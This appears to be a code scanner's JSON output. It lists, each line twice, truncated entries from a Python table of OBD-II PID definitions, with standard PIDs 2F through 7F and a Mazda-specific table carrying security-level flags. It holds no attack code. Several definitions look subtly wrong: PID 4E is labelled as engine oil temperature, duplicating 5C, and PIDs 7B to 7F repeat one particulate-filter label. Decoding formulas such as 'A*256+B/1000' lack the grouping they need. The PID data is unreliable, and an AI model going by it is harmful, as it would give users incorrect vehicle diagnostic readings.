{"type": "protocol", "line": 162, "protocol": "PID", "content": "\"2F\": OBDPID(\"2F\", \"Calibration Verification\", \"Calibration verification number\", \"\", 0, 0, \"A*256+B"}, {"type": "protocol", "line": 163, "protocol": "OBD", "content": "\"31\": OBDPID(\"31\", \"Distance Traveled Since Codes Cleared\", \"Distance since DTC clear\", \"km\", 0, 655"}, {"type": "protocol", "line": 163, "protocol": "PID", "content": "\"31\": OBDPID(\"31\", \"Distance Traveled Since Codes Cleared\", \"Distance since DTC clear\", \"km\", 0, 655"}, {"type": "protocol", "line": 164, "protocol": "OBD", "content": "\"33\": OBDPID(\"33\", \"Absolute Barometric Pressure\", \"Barometric pressure\", \"kPa\", 0, 255, \"A\", \"float"}, {"type": "protocol", "line": 164, "protocol": "PID", "content": "\"33\": OBDPID(\"33\", \"Absolute Barometric Pressure\", \"Barometric pressure\", \"kPa\", 0, 255, \"A\", \"float"}, {"type": "protocol", "line": 165, "protocol": "OBD", "content": "\"42\": OBDPID(\"42\", \"Control Module Voltage\", \"Control module voltage\", \"V\", 0, 65.535, \"A*256+B/1000"}, {"type": "protocol", "line": 165, "protocol": "PID", "content": "\"42\": OBDPID(\"42\", \"Control Module Voltage\", \"Control module voltage\", \"V\", 0, 65.535, \"A*256+B/1000"}, {"type": "protocol", "line": 166, "protocol": "OBD", "content": "\"43\": OBDPID(\"43\", \"Absolute Load Value\", \"Absolute engine load\", \"%\", 0, 25700, \"A*100/255\", \"float"}, {"type": "protocol", "line": 166, "protocol": "PID", "content": "\"43\": OBDPID(\"43\", \"Absolute Load Value\", \"Absolute engine load\", \"%\", 0, 25700, \"A*100/255\", \"float"}, {"type": "protocol", "line": 167, "protocol": "OBD", "content": "\"44\": OBDPID(\"44\", \"Commanded Air-Fuel Ratio\", \"Commanded air-fuel ratio\", \"\", 0, 0, \"A*256+B/32768\""}, {"type": "protocol", "line": 167, "protocol": "PID", "content": "\"44\": OBDPID(\"44\", \"Commanded Air-Fuel Ratio\", \"Commanded air-fuel ratio\", \"\", 0, 0, \"A*256+B/32768\""}, {"type": "protocol", "line": 168, "protocol": "OBD", "content": "\"45\": OBDPID(\"45\", \"Relative Throttle Position\", \"Relative throttle position\", \"%\", 0, 100, \"A*100/2"}, {"type": "protocol", "line": 168, "protocol": "PID", "content": "\"45\": OBDPID(\"45\", \"Relative Throttle Position\", \"Relative throttle position\", \"%\", 0, 100, \"A*100/2"}, {"type": "protocol", "line": 169, "protocol": "OBD", "content": "\"46\": OBDPID(\"46\", \"Ambient Air Temperature\", \"Ambient air temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"fl"}, {"type": "protocol", "line": 169, "protocol": "PID", "content": "\"46\": OBDPID(\"46\", \"Ambient Air Temperature\", \"Ambient air temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"fl"}, {"type": "protocol", "line": 170, "protocol": "OBD", "content": "\"47\": OBDPID(\"47\", \"Absolute Throttle Position B\", \"Absolute throttle position B\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 170, "protocol": "PID", "content": "\"47\": OBDPID(\"47\", \"Absolute Throttle Position B\", \"Absolute throttle position B\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 171, "protocol": "OBD", "content": "\"48\": OBDPID(\"48\", \"Absolute Throttle Position C\", \"Absolute throttle position C\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 171, "protocol": "PID", "content": "\"48\": OBDPID(\"48\", \"Absolute Throttle Position C\", \"Absolute throttle position C\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 172, "protocol": "OBD", "content": "\"49\": OBDPID(\"49\", \"Accelerator Pedal Position D\", \"Accelerator pedal position D\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 172, "protocol": "PID", "content": "\"49\": OBDPID(\"49\", \"Accelerator Pedal Position D\", \"Accelerator pedal position D\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 173, "protocol": "OBD", "content": "\"4A\": OBDPID(\"4A\", \"Accelerator Pedal Position E\", \"Accelerator pedal position E\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 173, "protocol": "PID", "content": "\"4A\": OBDPID(\"4A\", \"Accelerator Pedal Position E\", \"Accelerator pedal position E\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 174, "protocol": "OBD", "content": "\"4B\": OBDPID(\"4B\", \"Accelerator Pedal Position F\", \"Accelerator pedal position F\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 174, "protocol": "PID", "content": "\"4B\": OBDPID(\"4B\", \"Accelerator Pedal Position F\", \"Accelerator pedal position F\", \"%\", 0, 100, \"A*1"}, {"type": "protocol", "line": 175, "protocol": "OBD", "content": "\"4C\": OBDPID(\"4C\", \"Commanded Throttle Actuator\", \"Commanded throttle actuator\", \"%\", 0, 100, \"A*100"}, {"type": "protocol", "line": 175, "protocol": "PID", "content": "\"4C\": OBDPID(\"4C\", \"Commanded Throttle Actuator\", \"Commanded throttle actuator\", \"%\", 0, 100, \"A*100"}, {"type": "protocol", "line": 176, "protocol": "OBD", "content": "\"4E\": OBDPID(\"4E\", \"Engine Oil Temperature\", \"Engine oil temperature\", \"\u00b0C\", -40, 210, \"A-40\", \"floa"}, {"type": "protocol", "line": 176, "protocol": "PID", "content": "\"4E\": OBDPID(\"4E\", \"Engine Oil Temperature\", \"Engine oil temperature\", \"\u00b0C\", -40, 210, \"A-40\", \"floa"}, {"type": "protocol", "line": 177, "protocol": "OBD", "content": "\"51\": OBDPID(\"51\", \"Fuel Type\", \"Fuel type designation\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 177, "protocol": "PID", "content": "\"51\": OBDPID(\"51\", \"Fuel Type\", \"Fuel type designation\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 178, "protocol": "OBD", "content": "\"52\": OBDPID(\"52\", \"Ethanol Fuel %\", \"Ethanol fuel percentage\", \"%\", 0, 100, \"A*100/255\", \"float\"),"}, {"type": "protocol", "line": 178, "protocol": "PID", "content": "\"52\": OBDPID(\"52\", \"Ethanol Fuel %\", \"Ethanol fuel percentage\", \"%\", 0, 100, \"A*100/255\", \"float\"),"}, {"type": "protocol", "line": 179, "protocol": "OBD", "content": "\"53\": OBDPID(\"53\", \"Absolute Evap System Vapor Pressure\", \"Evap system vapor pressure\", \"kPa\", 0, 32"}, {"type": "protocol", "line": 179, "protocol": "PID", "content": "\"53\": OBDPID(\"53\", \"Absolute Evap System Vapor Pressure\", \"Evap system vapor pressure\", \"kPa\", 0, 32"}, {"type": "protocol", "line": 180, "protocol": "OBD", "content": "\"54\": OBDPID(\"54\", \"Evap System Vapor Pressure\", \"Evap vapor pressure\", \"Pa\", -32768, 32767, \"A*256+"}, {"type": "protocol", "line": 180, "protocol": "PID", "content": "\"54\": OBDPID(\"54\", \"Evap System Vapor Pressure\", \"Evap vapor pressure\", \"Pa\", -32768, 32767, \"A*256+"}, {"type": "protocol", "line": 181, "protocol": "OBD", "content": "\"5A\": OBDPID(\"5A\", \"Relative Accelerator Pedal Position\", \"Relative accelerator pedal position\", \"%\""}, {"type": "protocol", "line": 181, "protocol": "PID", "content": "\"5A\": OBDPID(\"5A\", \"Relative Accelerator Pedal Position\", \"Relative accelerator pedal position\", \"%\""}, {"type": "protocol", "line": 182, "protocol": "OBD", "content": "\"5B\": OBDPID(\"5B\", \"Hybrid Battery Pack Remaining Life\", \"Hybrid battery remaining life\", \"%\", 0, 10"}, {"type": "protocol", "line": 182, "protocol": "PID", "content": "\"5B\": OBDPID(\"5B\", \"Hybrid Battery Pack Remaining Life\", \"Hybrid battery remaining life\", \"%\", 0, 10"}, {"type": "protocol", "line": 183, "protocol": "OBD", "content": "\"5C\": OBDPID(\"5C\", \"Engine Oil Temperature\", \"Engine oil temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"floa"}, {"type": "protocol", "line": 183, "protocol": "PID", "content": "\"5C\": OBDPID(\"5C\", \"Engine Oil Temperature\", \"Engine oil temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"floa"}, {"type": "protocol", "line": 184, "protocol": "OBD", "content": "\"5D\": OBDPID(\"5D\", \"Fuel Injection Timing\", \"Fuel injection timing\", \"\u00b0\", -210, 301.992, \"A*256+B/12"}, {"type": "protocol", "line": 184, "protocol": "PID", "content": "\"5D\": OBDPID(\"5D\", \"Fuel Injection Timing\", \"Fuel injection timing\", \"\u00b0\", -210, 301.992, \"A*256+B/12"}, {"type": "protocol", "line": 185, "protocol": "OBD", "content": "\"5E\": OBDPID(\"5E\", \"Engine Fuel Rate\", \"Engine fuel rate\", \"L/h\", 0, 3212.75, \"A*256+B/20\", \"float\")"}, {"type": "protocol", "line": 185, "protocol": "PID", "content": "\"5E\": OBDPID(\"5E\", \"Engine Fuel Rate\", \"Engine fuel rate\", \"L/h\", 0, 3212.75, \"A*256+B/20\", \"float\")"}, {"type": "protocol", "line": 186, "protocol": "OBD", "content": "\"5F\": OBDPID(\"5F\", \"Emission Requirements\", \"Emission requirements\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 186, "protocol": "PID", "content": "\"5F\": OBDPID(\"5F\", \"Emission Requirements\", \"Emission requirements\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 187, "protocol": "OBD", "content": "\"61\": OBDPID(\"61\", \"Driver's Demand Engine - Percent Torque\", \"Driver's demand torque\", \"%\", -125, 1"}, {"type": "protocol", "line": 187, "protocol": "PID", "content": "\"61\": OBDPID(\"61\", \"Driver's Demand Engine - Percent Torque\", \"Driver's demand torque\", \"%\", -125, 1"}, {"type": "protocol", "line": 188, "protocol": "OBD", "content": "\"62\": OBDPID(\"62\", \"Actual Engine - Percent Torque\", \"Actual engine torque\", \"%\", -125, 125, \"A-125\""}, {"type": "protocol", "line": 188, "protocol": "PID", "content": "\"62\": OBDPID(\"62\", \"Actual Engine - Percent Torque\", \"Actual engine torque\", \"%\", -125, 125, \"A-125\""}, {"type": "protocol", "line": 189, "protocol": "OBD", "content": "\"63\": OBDPID(\"63\", \"Engine Reference Torque\", \"Engine reference torque\", \"Nm\", 0, 65535, \"A*256+B\", "}, {"type": "protocol", "line": 189, "protocol": "PID", "content": "\"63\": OBDPID(\"63\", \"Engine Reference Torque\", \"Engine reference torque\", \"Nm\", 0, 65535, \"A*256+B\", "}, {"type": "protocol", "line": 190, "protocol": "OBD", "content": "\"64\": OBDPID(\"64\", \"Engine Percent Torque Data\", \"Engine percent torque\", \"%\", -125, 125, \"A-125\", \""}, {"type": "protocol", "line": 190, "protocol": "PID", "content": "\"64\": OBDPID(\"64\", \"Engine Percent Torque Data\", \"Engine percent torque\", \"%\", -125, 125, \"A-125\", \""}, {"type": "protocol", "line": 191, "protocol": "OBD", "content": "\"65\": OBDPID(\"65\", \"Auxiliary Input/Output Supported\", \"Aux I/O supported\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 191, "protocol": "PID", "content": "\"65\": OBDPID(\"65\", \"Auxiliary Input/Output Supported\", \"Aux I/O supported\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 192, "protocol": "OBD", "content": "\"66\": OBDPID(\"66\", \"Mass Air Flow Sensor\", \"MAF sensor\", \"g/s\", 0, 65535, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 192, "protocol": "PID", "content": "\"66\": OBDPID(\"66\", \"Mass Air Flow Sensor\", \"MAF sensor\", \"g/s\", 0, 65535, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 193, "protocol": "OBD", "content": "\"67\": OBDPID(\"67\", \"Engine Coolant Temperature\", \"Engine coolant temperature\", \"\u00b0C\", -40, 215, \"A-40"}, {"type": "protocol", "line": 193, "protocol": "PID", "content": "\"67\": OBDPID(\"67\", \"Engine Coolant Temperature\", \"Engine coolant temperature\", \"\u00b0C\", -40, 215, \"A-40"}, {"type": "protocol", "line": 194, "protocol": "OBD", "content": "\"68\": OBDPID(\"68\", \"Intake Air Temperature Sensor\", \"Intake air temperature\", \"\u00b0C\", -40, 215, \"A-40\""}, {"type": "protocol", "line": 194, "protocol": "PID", "content": "\"68\": OBDPID(\"68\", \"Intake Air Temperature Sensor\", \"Intake air temperature\", \"\u00b0C\", -40, 215, \"A-40\""}, {"type": "protocol", "line": 195, "protocol": "OBD", "content": "\"69\": OBDPID(\"69\", \"Commanded EGR and EGR Error\", \"Commanded EGR\", \"%\", -100, 100, \"A-100\", \"float\")"}, {"type": "protocol", "line": 195, "protocol": "PID", "content": "\"69\": OBDPID(\"69\", \"Commanded EGR and EGR Error\", \"Commanded EGR\", \"%\", -100, 100, \"A-100\", \"float\")"}, {"type": "protocol", "line": 196, "protocol": "OBD", "content": "\"6A\": OBDPID(\"6A\", \"Commanded Intake Manifold Runner Control\", \"IMRC command\", \"%\", -100, 100, \"A-10"}, {"type": "protocol", "line": 196, "protocol": "PID", "content": "\"6A\": OBDPID(\"6A\", \"Commanded Intake Manifold Runner Control\", \"IMRC command\", \"%\", -100, 100, \"A-10"}, {"type": "protocol", "line": 197, "protocol": "OBD", "content": "\"6B\": OBDPID(\"6B\", \"Fuel Rail Pressure\", \"Fuel rail pressure\", \"kPa\", 0, 65535, \"A*256+B*0.1\", \"floa"}, {"type": "protocol", "line": 197, "protocol": "PID", "content": "\"6B\": OBDPID(\"6B\", \"Fuel Rail Pressure\", \"Fuel rail pressure\", \"kPa\", 0, 65535, \"A*256+B*0.1\", \"floa"}, {"type": "protocol", "line": 198, "protocol": "OBD", "content": "\"6C\": OBDPID(\"6C\", \"Fuel Pressure\", \"Fuel pressure\", \"kPa\", 0, 65535, \"A*256+B*0.1\", \"float\"),"}, {"type": "protocol", "line": 198, "protocol": "PID", "content": "\"6C\": OBDPID(\"6C\", \"Fuel Pressure\", \"Fuel pressure\", \"kPa\", 0, 65535, \"A*256+B*0.1\", \"float\"),"}, {"type": "protocol", "line": 199, "protocol": "OBD", "content": "\"6D\": OBDPID(\"6D\", \"Injector Pressure\", \"Injector pressure\", \"kPa\", 0, 65535, \"A*256+B*0.1\", \"float\""}, {"type": "protocol", "line": 199, "protocol": "PID", "content": "\"6D\": OBDPID(\"6D\", \"Injector Pressure\", \"Injector pressure\", \"kPa\", 0, 65535, \"A*256+B*0.1\", \"float\""}, {"type": "protocol", "line": 200, "protocol": "OBD", "content": "\"6E\": OBDPID(\"6E\", \"Fuel Rail Absolute Pressure\", \"Fuel rail absolute pressure\", \"kPa\", 0, 65535, \"A"}, {"type": "protocol", "line": 200, "protocol": "PID", "content": "\"6E\": OBDPID(\"6E\", \"Fuel Rail Absolute Pressure\", \"Fuel rail absolute pressure\", \"kPa\", 0, 65535, \"A"}, {"type": "protocol", "line": 201, "protocol": "OBD", "content": "\"6F\": OBDPID(\"6F\", \"Engine Friction Torque\", \"Engine friction torque\", \"Nm\", 0, 65535, \"A*256+B\", \"i"}, {"type": "protocol", "line": 201, "protocol": "PID", "content": "\"6F\": OBDPID(\"6F\", \"Engine Friction Torque\", \"Engine friction torque\", \"Nm\", 0, 65535, \"A*256+B\", \"i"}, {"type": "protocol", "line": 202, "protocol": "OBD", "content": "\"70\": OBDPID(\"70\", \"PM Sensor\", \"Particulate matter sensor\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 202, "protocol": "PID", "content": "\"70\": OBDPID(\"70\", \"PM Sensor\", \"Particulate matter sensor\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 203, "protocol": "OBD", "content": "\"71\": OBDPID(\"71\", \"Boost Pressure Control\", \"Boost pressure control\", \"%\", 0, 100, \"A\", \"float\"),"}, {"type": "protocol", "line": 203, "protocol": "PID", "content": "\"71\": OBDPID(\"71\", \"Boost Pressure Control\", \"Boost pressure control\", \"%\", 0, 100, \"A\", \"float\"),"}, {"type": "protocol", "line": 204, "protocol": "OBD", "content": "\"72\": OBDPID(\"72\", \"Variable Geometry Turbo Control\", \"VGT control\", \"%\", 0, 100, \"A\", \"float\"),"}, {"type": "protocol", "line": 204, "protocol": "PID", "content": "\"72\": OBDPID(\"72\", \"Variable Geometry Turbo Control\", \"VGT control\", \"%\", 0, 100, \"A\", \"float\"),"}, {"type": "protocol", "line": 205, "protocol": "OBD", "content": "\"73\": OBDPID(\"73\", \"Wastegate Control\", \"Wastegate control\", \"%\", 0, 100, \"A\", \"float\"),"}, {"type": "protocol", "line": 205, "protocol": "PID", "content": "\"73\": OBDPID(\"73\", \"Wastegate Control\", \"Wastegate control\", \"%\", 0, 100, \"A\", \"float\"),"}, {"type": "protocol", "line": 206, "protocol": "OBD", "content": "\"74\": OBDPID(\"74\", \"Exhaust Pressure\", \"Exhaust pressure\", \"kPa\", 0, 65535, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 206, "protocol": "PID", "content": "\"74\": OBDPID(\"74\", \"Exhaust Pressure\", \"Exhaust pressure\", \"kPa\", 0, 65535, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 207, "protocol": "OBD", "content": "\"75\": OBDPID(\"75\", \"Turbocharger RPM\", \"Turbocharger RPM\", \"RPM\", 0, 65535, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 207, "protocol": "PID", "content": "\"75\": OBDPID(\"75\", \"Turbocharger RPM\", \"Turbocharger RPM\", \"RPM\", 0, 65535, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 208, "protocol": "OBD", "content": "\"76\": OBDPID(\"76\", \"Turbocharger Temperature\", \"Turbocharger temperature\", \"\u00b0C\", -40, 215, \"A-40\", \""}, {"type": "protocol", "line": 208, "protocol": "PID", "content": "\"76\": OBDPID(\"76\", \"Turbocharger Temperature\", \"Turbocharger temperature\", \"\u00b0C\", -40, 215, \"A-40\", \""}, {"type": "protocol", "line": 209, "protocol": "OBD", "content": "\"77\": OBDPID(\"77\", \"Turbocharger Temperature\", \"Turbocharger temperature\", \"\u00b0C\", -40, 215, \"A-40\", \""}, {"type": "protocol", "line": 209, "protocol": "PID", "content": "\"77\": OBDPID(\"77\", \"Turbocharger Temperature\", \"Turbocharger temperature\", \"\u00b0C\", -40, 215, \"A-40\", \""}, {"type": "protocol", "line": 210, "protocol": "OBD", "content": "\"78\": OBDPID(\"78\", \"Turbocharger Ratio\", \"Turbocharger ratio\", \"\", 0, 0, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 210, "protocol": "PID", "content": "\"78\": OBDPID(\"78\", \"Turbocharger Ratio\", \"Turbocharger ratio\", \"\", 0, 0, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 211, "protocol": "OBD", "content": "\"79\": OBDPID(\"79\", \"Charge Air Cooler Temperature\", \"Charge air cooler temperature\", \"\u00b0C\", -40, 215,"}, {"type": "protocol", "line": 211, "protocol": "PID", "content": "\"79\": OBDPID(\"79\", \"Charge Air Cooler Temperature\", \"Charge air cooler temperature\", \"\u00b0C\", -40, 215,"}, {"type": "protocol", "line": 212, "protocol": "OBD", "content": "\"7A\": OBDPID(\"7A\", \"Exhaust Gas Temperature\", \"Exhaust gas temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"fl"}, {"type": "protocol", "line": 212, "protocol": "PID", "content": "\"7A\": OBDPID(\"7A\", \"Exhaust Gas Temperature\", \"Exhaust gas temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"fl"}, {"type": "protocol", "line": 213, "protocol": "OBD", "content": "\"7B\": OBDPID(\"7B\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 213, "protocol": "PID", "content": "\"7B\": OBDPID(\"7B\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 214, "protocol": "OBD", "content": "\"7C\": OBDPID(\"7C\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 214, "protocol": "PID", "content": "\"7C\": OBDPID(\"7C\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 215, "protocol": "OBD", "content": "\"7D\": OBDPID(\"7D\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 215, "protocol": "PID", "content": "\"7D\": OBDPID(\"7D\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 216, "protocol": "OBD", "content": "\"7E\": OBDPID(\"7E\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 216, "protocol": "PID", "content": "\"7E\": OBDPID(\"7E\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 217, "protocol": "OBD", "content": "\"7F\": OBDPID(\"7F\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 217, "protocol": "PID", "content": "\"7F\": OBDPID(\"7F\", \"Diesel Particulate Filter\", \"DPF status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 221, "protocol": "PID", "content": "MAZDA_SPECIFIC_PIDS = {"}, {"type": "protocol", "line": 222, "protocol": "OBD", "content": "\"A0\": OBDPID(\"A0\", \"Mazda Boost Target\", \"Target boost pressure\", \"psi\", 0, 30, \"A*0.145\", \"float\", "}, {"type": "protocol", "line": 222, "protocol": "PID", "content": "\"A0\": OBDPID(\"A0\", \"Mazda Boost Target\", \"Target boost pressure\", \"psi\", 0, 30, \"A*0.145\", \"float\", "}, {"type": "protocol", "line": 223, "protocol": "OBD", "content": "\"A1\": OBDPID(\"A1\", \"Mazda Boost Actual\", \"Actual boost pressure\", \"psi\", 0, 30, \"A*0.145\", \"float\", "}, {"type": "protocol", "line": 223, "protocol": "PID", "content": "\"A1\": OBDPID(\"A1\", \"Mazda Boost Actual\", \"Actual boost pressure\", \"psi\", 0, 30, \"A*0.145\", \"float\", "}, {"type": "protocol", "line": 224, "protocol": "OBD", "content": "\"A2\": OBDPID(\"A2\", \"Mazda Wastegate Duty\", \"Wastegate duty cycle\", \"%\", 0, 100, \"A*100/255\", \"float\""}, {"type": "protocol", "line": 224, "protocol": "PID", "content": "\"A2\": OBDPID(\"A2\", \"Mazda Wastegate Duty\", \"Wastegate duty cycle\", \"%\", 0, 100, \"A*100/255\", \"float\""}, {"type": "protocol", "line": 225, "protocol": "OBD", "content": "\"A3\": OBDPID(\"A3\", \"Mazda Ignition Timing\", \"Ignition timing advance\", \"\u00b0\", -20, 60, \"A-20\", \"float\""}, {"type": "protocol", "line": 225, "protocol": "PID", "content": "\"A3\": OBDPID(\"A3\", \"Mazda Ignition Timing\", \"Ignition timing advance\", \"\u00b0\", -20, 60, \"A-20\", \"float\""}, {"type": "protocol", "line": 226, "protocol": "OBD", "content": "\"A4\": OBDPID(\"A4\", \"Mazda Fuel Pressure\", \"High pressure fuel pump\", \"MPa\", 0, 200, \"A*0.1\", \"float\""}, {"type": "protocol", "line": 226, "protocol": "PID", "content": "\"A4\": OBDPID(\"A4\", \"Mazda Fuel Pressure\", \"High pressure fuel pump\", \"MPa\", 0, 200, \"A*0.1\", \"float\""}, {"type": "protocol", "line": 227, "protocol": "OBD", "content": "\"A5\": OBDPID(\"A5\", \"Mazda Knock Retard\", \"Knock retard\", \"\u00b0\", 0, 20, \"A*0.25\", \"float\", True, Securi"}, {"type": "protocol", "line": 227, "protocol": "PID", "content": "\"A5\": OBDPID(\"A5\", \"Mazda Knock Retard\", \"Knock retard\", \"\u00b0\", 0, 20, \"A*0.25\", \"float\", True, Securi"}, {"type": "protocol", "line": 228, "protocol": "OBD", "content": "\"A6\": OBDPID(\"A6\", \"Mazda Oil Pressure\", \"Oil pressure\", \"psi\", 0, 100, \"A*0.5\", \"float\", True, Secu"}, {"type": "protocol", "line": 228, "protocol": "PID", "content": "\"A6\": OBDPID(\"A6\", \"Mazda Oil Pressure\", \"Oil pressure\", \"psi\", 0, 100, \"A*0.5\", \"float\", True, Secu"}, {"type": "protocol", "line": 229, "protocol": "OBD", "content": "\"A7\": OBDPID(\"A7\", \"Mazda Transmission Gear\", \"Current gear\", \"\", 0, 6, \"A\", \"int\", True, SecurityLe"}, {"type": "protocol", "line": 229, "protocol": "PID", "content": "\"A7\": OBDPID(\"A7\", \"Mazda Transmission Gear\", \"Current gear\", \"\", 0, 6, \"A\", \"int\", True, SecurityLe"}, {"type": "protocol", "line": 230, "protocol": "OBD", "content": "\"A8\": OBDPID(\"A8\", \"Mazda Torque Request\", \"Torque request\", \"Nm\", 0, 400, \"A*2\", \"float\", True, Sec"}, {"type": "protocol", "line": 230, "protocol": "PID", "content": "\"A8\": OBDPID(\"A8\", \"Mazda Torque Request\", \"Torque request\", \"Nm\", 0, 400, \"A*2\", \"float\", True, Sec"}, {"type": "protocol", "line": 231, "protocol": "OBD", "content": "\"A9\": OBDPID(\"A9\", \"Mazda Torque Actual\", \"Actual torque\", \"Nm\", 0, 400, \"A*2\", \"float\", True, Secur"}, {"type": "protocol", "line": 231, "protocol": "PID", "content": "\"A9\": OBDPID(\"A9\", \"Mazda Torque Actual\", \"Actual torque\", \"Nm\", 0, 400, \"A*2\", \"float\", True, Secur"}, {"type": "protocol", "line": 232, "protocol": "OBD", "content": "\"AA\": OBDPID(\"AA\", \"Mazda AFR Target\", \"Target AFR\", \"\", 10, 20, \"A*0.1+10\", \"float\", True, Security"}, {"type": "protocol", "line": 232, "protocol": "PID", "content": "\"AA\": OBDPID(\"AA\", \"Mazda AFR Target\", \"Target AFR\", \"\", 10, 20, \"A*0.1+10\", \"float\", True, Security"}, {"type": "protocol", "line": 233, "protocol": "OBD", "content": "\"AB\": OBDPID(\"AB\", \"Mazda AFR Actual\", \"Actual AFR\", \"\", 10, 20, \"A*0.1+10\", \"float\", True, Security"}, {"type": "protocol", "line": 233, "protocol": "PID", "content": "\"AB\": OBDPID(\"AB\", \"Mazda AFR Actual\", \"Actual AFR\", \"\", 10, 20, \"A*0.1+10\", \"float\", True, Security"}, {"type": "protocol", "line": 234, "protocol": "OBD", "content": "\"AC\": OBDPID(\"AC\", \"Mazda Dwell Time\", \"Ignition coil dwell\", \"ms\", 0, 10, \"A*0.04\", \"float\", True, "}, {"type": "protocol", "line": 234, "protocol": "PID", "content": "\"AC\": OBDPID(\"AC\", \"Mazda Dwell Time\", \"Ignition coil dwell\", \"ms\", 0, 10, \"A*0.04\", \"float\", True, "}, {"type": "protocol", "line": 235, "protocol": "OBD", "content": "\"AD\": OBDPID(\"AD\", \"Mazda Valve Timing\", \"Valve timing advance\", \"\u00b0\", -20, 60, \"A-20\", \"float\", True"}, {"type": "protocol", "line": 235, "protocol": "PID", "content": "\"AD\": OBDPID(\"AD\", \"Mazda Valve Timing\", \"Valve timing advance\", \"\u00b0\", -20, 60, \"A-20\", \"float\", True"}, {"type": "protocol", "line": 236, "protocol": "OBD", "content": "\"AE\": OBDPID(\"AE\", \"Mazda Throttle Desired\", \"Desired throttle position\", \"%\", 0, 100, \"A*100/255\", "}, {"type": "protocol", "line": 236, "protocol": "PID", "content": "\"AE\": OBDPID(\"AE\", \"Mazda Throttle Desired\", \"Desired throttle position\", \"%\", 0, 100, \"A*100/255\", "}, {"type": "protocol", "line": 237, "protocol": "OBD", "content": "\"AF\": OBDPID(\"AF\", \"Mazda Fuel Trim Bank 1\", \"Bank 1 fuel trim\", \"%\", -25, 25, \"A*0.5-25\", \"float\", "}, {"type": "protocol", "line": 237, "protocol": "PID", "content": "\"AF\": OBDPID(\"AF\", \"Mazda Fuel Trim Bank 1\", \"Bank 1 fuel trim\", \"%\", -25, 25, \"A*0.5-25\", \"float\", "}, {"type": "protocol", "line": 238, "protocol": "OBD", "content": "\"B0\": OBDPID(\"B0\", \"Mazda Fuel Trim Bank 2\", \"Bank 2 fuel trim\", \"%\", -25, 25, \"A*0.5-25\", \"float\", "}, {"type": "protocol", "line": 238, "protocol": "PID", "content": "\"B0\": OBDPID(\"B0\", \"Mazda Fuel Trim Bank 2\", \"Bank 2 fuel trim\", \"%\", -25, 25, \"A*0.5-25\", \"float\", "}, {"type": "protocol", "line": 239, "protocol": "OBD", "content": "\"B1\": OBDPID(\"B1\", \"Mazda ECU Temperature\", \"ECU internal temperature\", \"\u00b0C\", -40, 125, \"A-40\", \"flo"}, {"type": "protocol", "line": 239, "protocol": "PID", "content": "\"B1\": OBDPID(\"B1\", \"Mazda ECU Temperature\", \"ECU internal temperature\", \"\u00b0C\", -40, 125, \"A-40\", \"flo"}, {"type": "protocol", "line": 240, "protocol": "OBD", "content": "\"B2\": OBDPID(\"B2\", \"Mazda Battery Voltage\", \"Battery voltage\", \"V\", 0, 20, \"A*0.08\", \"float\", True, "}, {"type": "protocol", "line": 240, "protocol": "PID", "content": "\"B2\": OBDPID(\"B2\", \"Mazda Battery Voltage\", \"Battery voltage\", \"V\", 0, 20, \"A*0.08\", \"float\", True, "}, {"type": "protocol", "line": 241, "protocol": "OBD", "content": "\"B3\": OBDPID(\"B3\", \"Mazda Load Absolute\", \"Absolute engine load\", \"%\", 0, 100, \"A*100/255\", \"float\","}, {"type": "protocol", "line": 241, "protocol": "PID", "content": "\"B3\": OBDPID(\"B3\", \"Mazda Load Absolute\", \"Absolute engine load\", \"%\", 0, 100, \"A*100/255\", \"float\","}, {"type": "protocol", "line": 242, "protocol": "OBD", "content": "\"B4\": OBDPID(\"B4\", \"Mazda Acceleration Enrichment\", \"Acceleration enrichment\", \"%\", 0, 50, \"A*0.2\", "}, {"type": "protocol", 